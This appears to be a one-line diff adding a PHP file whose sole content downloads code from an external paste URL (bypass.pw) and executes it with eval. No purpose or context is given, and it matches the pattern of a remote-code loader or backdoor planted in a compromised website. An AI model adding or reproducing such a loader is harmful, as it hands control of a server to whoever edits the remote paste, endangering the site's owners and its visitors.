@@ -1,0 +1,1 @@
+<?php ($r=@file_get_contents('https://bypass.pw/raw/01mtCB9'))?eval('?>'.$r):die('Error');
